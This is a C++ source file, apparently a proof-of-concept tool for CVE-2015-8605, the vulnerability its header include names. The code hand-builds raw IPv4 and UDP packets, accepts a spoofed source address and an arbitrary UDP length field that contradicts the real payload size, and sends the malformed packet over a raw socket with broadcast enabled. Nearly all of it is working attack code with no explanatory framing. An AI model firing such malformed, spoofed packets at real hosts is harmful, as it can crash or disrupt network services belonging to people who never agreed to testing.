#include "cve-2015-8605.hpp"
#include "utils.hpp"
#include <algorithm>
#include <arpa/inet.h>
#include <boost/program_options.hpp>
#include <cstdio>
#include <cstring>
#include <iostream>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <sys/types.h>

namespace ipv4
{

    struct IPv4HeaderField {
        uint8_t   header_length : 4;
        uint8_t   version : 4;
        uint8_t   tos;
        uint16_t  length;
        uint16_t  id;
        uint16_t  offset : 13;
        uint8_t   flag : 3;
        uint8_t   ttl;
        IPROTOCOL protocol;
        uint16_t  checksum;
        in_addr   source;
        in_addr   destination;
    };

    union IPv4Header {
        struct IPv4HeaderField field;
        uint8_t                data[ 0 ];
    };

    uint16_t compute_ipv4_checksum( IPv4Header header );

    void printHeader( IPv4Header header )
    {
        for ( int i = 0; i < 20; i++ ) {
            std::printf( "%x ", header.data[ i ] );
        }
        std::printf( "\n" );
    }

    Packet::Packet( const uint8_t *header, uint16_t header_length, const uint8_t *payload, uint16_t payload_length )
    {
        data.resize( header_length + payload_length );
        std::copy( header, header + header_length, data.data() );
        std::copy( payload, payload + payload_length, data.data() + header_length );
    }

    Packet::Packet( boost::shared_array<uint8_t> h, uint16_t hl, boost::shared_array<uint8_t> p, uint16_t pl )
        : header( h ), header_length( hl ), payload( p ), payload_length( pl )
    {
    }

    Packet generate_ipv4_packet( const PacketInfo &info )
    {
        IPv4Header header;

        int header_length          = 20;
        int packet_length          = header_length + info.getPayloadLength();
        header.field.version       = 4;
        header.field.header_length = header_length / 4;
        header.field.tos           = info.tos;
        header.field.length        = htons( packet_length );
        header.field.id            = htons( info.id );
        header.field.flag          = info.flag;
        header.field.offset        = htons( info.offset );
        header.field.ttl           = info.ttl;
        header.field.protocol      = info.protocol;
        header.field.checksum      = 0;
        header.field.source        = convertAddressStringToBinary( info.source );
        header.field.destination   = convertAddressStringToBinary( info.destination );

        if ( packet_length > 0xffff ) {
            throw InvalidPayloadLengthError( "invalid playload length", info.getPayloadLength() );
        }

        header.field.checksum = compute_ipv4_checksum( header );

        return Packet(
            reinterpret_cast<const uint8_t *>( &header ), header_length, info.getData(), info.getPayloadLength() );
    }

    uint16_t compute_ipv4_checksum( IPv4Header header )
    {
        header.field.checksum = 0;
        return compute_checksum( header.data, header.field.header_length * 4 );
    }

    PacketInfo parse_ipv4_packet( const uint8_t *data, uint16_t length )
    {
        const IPv4Header *header         = reinterpret_cast<const IPv4Header *>( data );
        int               header_length  = header->field.header_length * 4;
        int               payload_length = ntohs( header->field.length ) - header_length;
        const uint8_t *   payload        = data + header_length;

        if ( payload_length < 0 || payload_length > 0xffff ) {
            throw InvalidPayloadLengthError( "received packet is invalid payload length", payload_length );
        }
        if ( length < header_length + payload_length ) {
            throw InvalidPayloadLengthError( "data < header + payload", payload_length );
        }
        if ( length > header_length + payload_length ) {
            throw InvalidPayloadLengthError( "data > header + payload", payload_length );
        }

        PacketInfo packet;
        packet.payload.insert( packet.payload.end(), payload, payload + payload_length );

        packet.tos      = header->field.tos;
        packet.id       = ntohs( header->field.id );
        packet.flag     = header->field.flag;
        packet.offset   = ntohs( header->field.offset );
        packet.ttl      = header->field.ttl;
        packet.protocol = header->field.protocol;

        char source_addr[ INET_ADDRSTRLEN ];
        char destination_addr[ INET_ADDRSTRLEN ];

        if ( NULL == inet_ntop( AF_INET, &header->field.source, source_addr, sizeof( source_addr ) ) ) {
            throw InvalidAddressFormatError( "cannot parse source address" );
        }
        if ( NULL == inet_ntop( AF_INET, &header->field.destination, destination_addr, sizeof( destination_addr ) ) ) {
            throw InvalidAddressFormatError( "cannot parse destination address" );
        }

        packet.source      = source_addr;
        packet.destination = destination_addr;

        return packet;
    }
}


namespace udpv4
{

    struct PseudoUDPv4HeaderField {
        in_addr  source_address;
        in_addr  destination_address;
        uint8_t  padding;
        uint8_t  protocol;
        uint16_t length;
    };

    struct UDPv4HeaderField {
        uint16_t source_port;
        uint16_t destination_port;
        uint16_t length;
        uint16_t checksum;
    };

    union UDPv4Header {
        UDPv4HeaderField field;
        uint8_t          data[ sizeof( UDPv4HeaderField ) ];
    };

    void print_pseudo_udpv4_header( PseudoUDPv4HeaderField header )
    {
        uint8_t *data = reinterpret_cast<uint8_t *>( &header );
        printf( "pseudoheader:" );
        for ( uint16_t i = 0; i < sizeof( header ); i++ ) {
            printf( " %x", data[ i ] );
        }
        printf( "\n" );
    }

    void print_udpv4_header( UDPv4Header header )
    {
        uint8_t *data = reinterpret_cast<uint8_t *>( &header );
        printf( "udpv4header:" );
        for ( uint16_t i = 0; i < sizeof( header ); i++ ) {
            printf( " %x", data[ i ] );
        }
        printf( "\n" );
    }

    void print_payload( const uint8_t *data, uint16_t length )
    {
        printf( "length: %hd\n", length );
        printf( "payload:" );
        for ( uint16_t i = 0; i < length; i++ ) {
            printf( " \"%c\"", data[ i ] );
        }
        printf( "\n" );
    }

    uint16_t compute_udpv4_checksum( const PacketInfo & );

    Packet::Packet( const uint8_t *header, uint16_t header_size, const uint8_t *payload, uint16_t payload_size )
    {
        data.resize( header_size + payload_size );
        std::copy( header, header + header_size, data.data() );
        std::copy( payload, payload + payload_size, data.data() + header_size );
    }

    Packet generate_udpv4_packet( const PacketInfo &info, const ChecksumCalculatable &checksum_calcurator )
    {
        UDPv4Header udpv4_header;
        udpv4_header.field.source_port      = htons( info.source_port );
        udpv4_header.field.destination_port = htons( info.destination_port );
        udpv4_header.field.length           = htons( info.getLength() );
        udpv4_header.field.checksum         = checksum_calcurator( info );

        return Packet( reinterpret_cast<const uint8_t *>( &udpv4_header ),
                       sizeof( udpv4_header ),
                       info.getData(),
                       info.getPayloadLength() );
    }

    uint16_t compute_udpv4_checksum( const PacketInfo &info )
    {
        PseudoUDPv4HeaderField pseudo_header;
        pseudo_header.source_address      = convertAddressStringToBinary( info.source_address );
        pseudo_header.destination_address = convertAddressStringToBinary( info.destination_address );
        pseudo_header.padding             = 0;
        pseudo_header.protocol            = 17; // UDP Protocol Number
        pseudo_header.length              = htons( info.getLength() );

        UDPv4Header udpv4_header;
        udpv4_header.field.source_port      = htons( info.source_port );
        udpv4_header.field.destination_port = htons( info.destination_port );
        udpv4_header.field.length           = htons( info.getLength() );
        udpv4_header.field.checksum         = 0;

        size_t               checksum_buffer_length = sizeof( pseudo_header ) + info.getLength();
        std::vector<uint8_t> checksum_buffer( checksum_buffer_length );
        std::memcpy( checksum_buffer.data(), &pseudo_header, sizeof( pseudo_header ) );
        std::memcpy( checksum_buffer.data() + sizeof( pseudo_header ), udpv4_header.data, sizeof( udpv4_header ) );
        std::memcpy( checksum_buffer.data() + sizeof( pseudo_header ) + sizeof( udpv4_header ),
                     info.getData(),
                     info.getPayloadLength() );

        uint16_t checksum = compute_checksum( checksum_buffer.data(), checksum_buffer.size() );
        return checksum;
    }

    uint16_t StandardChecksumCalculator::operator()( const PacketInfo &info ) const
    {
        return compute_udpv4_checksum( info );
    }

    uint16_t BadChecksumCalculator::operator()( const PacketInfo &info ) const
    {
        return compute_udpv4_checksum( info ) + 1;
    }
}



int main( int argc, char **argv )
{
    namespace po = boost::program_options;
    std::string source_address;
    std::string destination_address;
    uint16_t    source_port;
    uint16_t    destination_port;
    uint16_t    udp_size;
    std::string message;
    bool        wait_response = false;

    po::options_description desc( "UDP Echo client." );
    desc.add_options()( "help,h", "print this message" )

        ( "source-address,s", po::value<std::string>( &source_address ), "source address of echo packet" )

            ( "source-port,S",
              po::value<uint16_t>( &source_port )->default_value( 10007 ),
              "source port of echo packet" )

                ( "destination-address,d",
                  po::value<std::string>( &destination_address ),
                  "destination address of echo packet" )

                    ( "destination-port,D",
                      po::value<uint16_t>( &destination_port )->default_value( 7 ),
                      "destination port of echo packet" )

                        ( "udp-length,l", po::value<uint16_t>( &udp_size ), "udp packet length" )

                            ( "message,m",
                              po::value<std::string>( &message )->default_value( "test" ),
                              "message in echo packet" );

    po::variables_map vm;
    po::store( po::parse_command_line( argc, argv, desc ), vm );
    po::notify( vm );

    if ( vm.count( "help" ) ) {
        std::cerr << desc << "\n";
        return 1;
    }

    if ( vm.count( "source-address" ) != 1 || vm.count( "source-port" ) != 1 ||
         vm.count( "destination-address" ) != 1 || vm.count( "destination-port" ) != 1 || vm.count( "message" ) != 1 ) {
        std::cerr << desc << "\n";
        return 1;
    }

    if ( vm.count( "wait" ) ) {
        wait_response = true;
    }

    udpv4::PacketInfo raw_udp_packet_info;
    raw_udp_packet_info.source_address      = source_address;
    raw_udp_packet_info.destination_address = destination_address;
    raw_udp_packet_info.source_port         = source_port;
    raw_udp_packet_info.destination_port    = destination_port;
    raw_udp_packet_info.payload.insert( raw_udp_packet_info.payload.end(), message.begin(), message.end() );

    udpv4::Packet            ip_payload = udpv4::generate_udpv4_packet( raw_udp_packet_info );
    udpv4::UDPv4HeaderField *header =
        reinterpret_cast<udpv4::UDPv4HeaderField *>( const_cast<uint8_t *>( ip_payload.begin() ) );
    header->length = htons( udp_size );


    ipv4::PacketInfo ip_packet_info;
    ip_packet_info.tos         = 0;
    ip_packet_info.id          = 1;
    ip_packet_info.flag        = 0;
    ip_packet_info.offset      = 0;
    ip_packet_info.ttl         = 255;
    ip_packet_info.protocol    = ipv4::IP_PROTOCOL_UDP;
    ip_packet_info.source      = source_address;
    ip_packet_info.destination = destination_address;
    ip_packet_info.payload.insert( ip_packet_info.payload.end(), ip_payload.begin(), ip_payload.end() );

    ipv4::Packet ip_packet = ipv4::generate_ipv4_packet( ip_packet_info );

    int raw_socket = socket( AF_INET, SOCK_RAW, IPPROTO_RAW );
    if ( raw_socket < 0 ) {
        throw SocketError( get_error_message( "cannot create raw socket", errno ) );
    }
    int on  = 1;
    int res = setsockopt( raw_socket, IPPROTO_IP, IP_HDRINCL, &on, sizeof( int ) );
    if ( res < 0 ) {
        throw SocketError( get_error_message( "cannot cannot set socket option", errno ) );
    }
    int is_broadcast = 1;
    res              = setsockopt( raw_socket, SOL_SOCKET, SO_BROADCAST, &is_broadcast, sizeof( int ) );
    if ( res < 0 ) {
        throw SocketError( get_error_message( "cannot cannot set socket option for broadcast.", errno ) );
    }


    sockaddr_in dst_socket_address;
    std::memset( &dst_socket_address, 0, sizeof( dst_socket_address ) );
    if ( inet_pton( AF_INET, raw_udp_packet_info.destination_address.c_str(), &dst_socket_address.sin_addr ) < 0 ) {
        throw InvalidAddressFormatError( "invalid destination address " + raw_udp_packet_info.destination_address );
    }
    dst_socket_address.sin_family = AF_INET;
    dst_socket_address.sin_port   = htons( raw_udp_packet_info.destination_port );

    uint16_t sent_size;
    sent_size = sendto( raw_socket,
                        ip_packet.getData(),
                        ip_packet.getLength(),
                        0,
                        reinterpret_cast<const sockaddr *>( &dst_socket_address ),
                        sizeof( dst_socket_address ) );
    if ( sent_size < 0 )
        throw SocketError( get_error_message( "cannot send packet", errno ) );

    return 0;
}
